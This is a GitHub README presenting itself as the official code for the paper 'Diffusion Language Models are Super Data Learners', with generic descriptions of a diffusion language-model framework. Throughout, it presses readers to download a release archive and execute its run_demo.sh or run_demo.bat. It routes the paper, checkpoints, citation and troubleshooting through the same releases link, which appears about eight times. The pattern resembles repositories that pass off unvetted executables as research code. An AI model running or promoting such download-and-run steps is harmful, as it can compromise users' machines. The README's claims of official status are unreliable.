[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge)](https://github.com/makash33/dlms-are-super-data-learners/releases)

# Diffusion Language Models — Super Data Learners Guide and Tools 🧠🔬

![Diffusion illustration](https://images.unsplash.com/photo-1526378721073-8f1fb3f3b8b1?auto=format&fit=crop&w=1200&q=60)

Repository: dlms-are-super-data-learners  
The official GitHub repo for "Diffusion Language Models are Super Data Learners".  
Visit releases to download runnable artifacts: https://github.com/makash33/dlms-are-super-data-learners/releases

- Purpose: provide code, checkpoints, scripts, and docs for diffusion-based language modeling experiments.
- Scope: training, fine-tuning, sampling, evaluation, and small production helpers.
- Audience: researchers, ML engineers, and advanced students.

Quick links
- Releases (download and run): https://github.com/makash33/dlms-are-super-data-learners/releases
- Paper: included in releases
- Checkpoints: included in releases

Badges
[![PyPI Version](https://img.shields.io/pypi/v/dlms?style=flat-square)](https://pypi.org/project/dlms) [![License](https://img.shields.io/badge/license-Apache%202.0-green?style=flat-square)](LICENSE)

What this repo contains
- A modular diffusion language model framework. Core components: noise schedule, denoiser network, scheduler, tokenizer glue.
- Training scripts with distributed and single-GPU support.
- Sampling scripts for conditional and unconditional text generation.
- Data loaders for common corpora and a small curated dataset for low-resource tests.
- Prebuilt release artifacts. Download and execute the release asset to run demos and evaluate checkpoints.

Important: download and execute the release asset
The releases page contains ready-to-run assets. Download the asset that matches your OS and follow the included run script. Example commands (replace file name with the chosen release asset):

- Linux / macOS (example)
```bash
wget https://github.com/makash33/dlms-are-super-data-learners/releases/download/v1.0/dlms-v1.0-linux.tar.gz
tar -xzf dlms-v1.0-linux.tar.gz
cd dlms-v1.0
chmod +x run_demo.sh
./run_demo.sh
```

- Windows (example)
1. Download the ZIP from: https://github.com/makash33/dlms-are-super-data-learners/releases
2. Extract and run run_demo.bat

If a direct asset link fails, check the Releases section on GitHub for available assets and instructions:
https://github.com/makash33/dlms-are-super-data-learners/releases

Features at a glance
- Diffusion-based text model core. Uses continuous-time noise and score-matching loss.
- U-Net style denoiser with attention blocks for long-range context.
- Conditional sampling via classifier-free guidance.
- Support for switchable tokenizers and byte-level BPE.
- Fast sampling modes using a trained sampler network.
- Evaluation scripts for perplexity, BLEU, ROUGE, and MMLU-style tasks.
- Repro scripts for ablation studies.

Getting started (source)
1. Clone the repo
```bash
git clone https://github.com/makash33/dlms-are-super-data-learners.git
cd dlms-are-super-data-learners
```
2. Create a virtual environment and install
```bash
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
pip install -e .
```
3. Prepare data
- Place text files or dataset manifests in data/
- Use scripts in data_prep/ to build tokenized inputs.

Quick demo (local)
```bash
python scripts/sample.py --checkpoint checkpoints/dlms_small.ckpt \
  --prompt "In recent research" --length 128 --temperature 1.0
```

Core concepts explained
- Diffusion process: we corrupt text embeddings with Gaussian noise through T steps. The denoiser learns to reverse this process.
- Score matching: the model learns the gradient of the log-density of noisy data. We use simplified denoising score matching with a reconstruction term.
- Classifier-free guidance: we train conditional and unconditional heads and mix them during sampling to control fidelity.
- Sampler networks: to speed inference, we train a small student sampler that predicts denoised embeddings in fewer steps.

Model architecture (high level)
- Tokenizer: Byte-Pair Encoding or SentencePiece. Switchable in config.
- Embedding layer: 768–2048 dims depending on model size.
- Denoiser: U-Net with temporal conditioning via FiLM layers.
- Attention: layered self-attention blocks for sequence modeling.
- Output head: projection to vocabulary logits or to embedding space for iterative decoding.

Training recipes
- Base recipe (single GPU)
  - Batch size: 64
  - Sequence length: 512
  - Optimizer: AdamW, lr = 2e-4
  - Noise schedule: cosine
  - Steps: 200k
  - Checkpoint every 5k steps

- Distributed recipe
  - Use torch.distributed.launch
  - Use gradient accumulation to maintain effective batch size
  - Mixed precision recommended (AMP)

- Fine-tuning on downstream tasks
  - Start from a pre-trained diffusion LM
  - Fine-tune with a small learning rate (1e-5 to 5e-5)
  - Use task-specific conditioning tokens

Sampling modes
- Full reverse diffusion: slow, highest quality.
- Fast sampler: learned sampler with few steps, lower compute.
- Deterministic sampling: use DDIM-style deterministic trajectories.
- Conditional sampling: pass context tokens and guidance weight.

Evaluation and benchmarks
- Perplexity: measure over held-out test sets using model likelihood.
- Text quality: BLEU, ROUGE for summarization and translation tests.
- Human evaluation: crowd-rated coherence and relevance.
- Downstream tasks: fine-tune and evaluate on GLUE-like tasks for transfer performance.

Experiments included
- Data scaling: compare 10M, 100M, and 1B tokens.
- Guidance sweep: guide weights between 0.0 and 2.0.
- Sampler ablation: vary steps and measure quality/latency trade-off.

Metrics logs and plots
- The releases include CSV logs and PNG plots for each experiment.
- Use the scripts in tools/plot_metrics.py to reproduce charts.

API overview
- dlms.model.DiffusionLM
  - load_checkpoint(path)
  - sample(prompt, length, steps, guidance)
  - evaluate(dataset)
- dlms.trainer.Trainer
  - train(cfg)
  - resume(checkpoint)
- dlms.data.DatasetBuilder
  - build_from_raw(path, vocab, seq_len)

Examples
- Generation from a prompt
```python
from dlms.model import DiffusionLM
model = DiffusionLM.load_checkpoint("checkpoints/dlms_small.ckpt")
out = model.sample("Research on diffusion models", length=128, steps=50, guidance=1.2)
print(out)
```

- Fine-tune on custom dataset
```bash
python scripts/train.py --config configs/finetune.yaml
```

Releases and runnable asset (again)
Visit and download the release asset from:
https://github.com/makash33/dlms-are-super-data-learners/releases

Each release includes:
- A runnable tarball or zip with demo scripts.
- Model checkpoints and example configs.
- A README within the release with exact run commands for that version.
After download, execute the provided run script for a guided demo.

Data and datasets
- Small curated dataset included for fast tests (license compatible).
- Scripts provided to download and prepare common corpora (Wiki, Books, OpenWebText).
- For large-scale runs, prepare data in streaming format to avoid storage issues.

Hardware and performance
- Small models run on a single GPU (8–16GB).
- Medium and large models require multi-GPU setups or TPU.
- Use mixed precision and gradient accumulation for efficiency.

Best practices
- Keep sequences short for initial experiments.
- Use checkpointing to save state regularly.
- Validate generation quality using held-out prompts, not training prompts.
- Log metrics and seed RNG for reproducibility.

Contributing
- Open issues for bugs or feature requests.
- Fork, branch, and submit pull requests with tests.
- Follow the code style in CONTRIBUTING.md and run linters.
- Include experiments as reproducible scripts with configs.

Citation
If you use this repo or models in a paper, cite the project:
- Title: Diffusion Language Models are Super Data Learners
- Link to release page for DOI and paper PDF: https://github.com/makash33/dlms-are-super-data-learners/releases

License
- Apache 2.0 (see LICENSE file)

Contact and maintainers
- Maintainer: makash33 (GitHub)
- Open an issue for reproducibility requests or data access.

Assets and media
- Use the demo images in assets/ for slides and figures.
- Charts in docs/ show training curves and sampling latency.

References and further reading
- Key papers on diffusion models and score matching.
- Tutorials and notebooks in notebooks/ for step-by-step learning.

Troubleshooting tips
- If a release asset fails to run, re-download the correct OS artifact from:
  https://github.com/makash33/dlms-are-super-data-learners/releases
- Check logs in logs/ for stack traces.
- Ensure CUDA and driver versions match the requirements file.

Folder layout (high level)
- src/ : core codebase
- scripts/ : training and sampling CLI
- data_prep/ : dataset builders and tokenizers
- checkpoints/ : model checkpoints (gitignored)
- docs/ : experiment notes and plots
- tools/ : plotting and helper scripts

Security and licensing
- All third-party libraries are listed in requirements.txt.
- Check license compatibility before using model checkpoints commercially.

Acknowledgements
- Based on community work on diffusion models and language modeling.
- Contributors and dataset providers listed in CONTRIBUTORS.md

Examples gallery
- See demos/ for sample outputs and example prompts.
- For an interactive demo, download the release and run the included notebook or script:
  https://github.com/makash33/dlms-are-super-data-learners/releases

End of README content.